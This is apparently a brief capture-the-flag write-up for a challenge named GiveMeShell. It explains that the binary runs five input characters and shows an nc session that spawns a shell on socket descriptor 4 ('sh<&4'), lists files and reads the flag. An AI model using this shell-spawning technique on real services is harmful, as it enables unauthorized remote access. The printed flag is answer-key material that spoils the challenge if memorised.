## GiveMeShell

first of all, givemeshell is the "ELF 32-bit LSB executable". 
By trying a bit of reverse engineering, you get to know that the challenge executes the first 5 characters of the input in the remote shell.
since the program accesses the input with the fork, we can use the file descriptor 4 (which is socket) to spawn the shell and list the key.

```
C:\Users\Samsung>nc 119.70.231.180 8765
sh<&4
ls>&4
cat key>&4
key : WeLoveShell
```

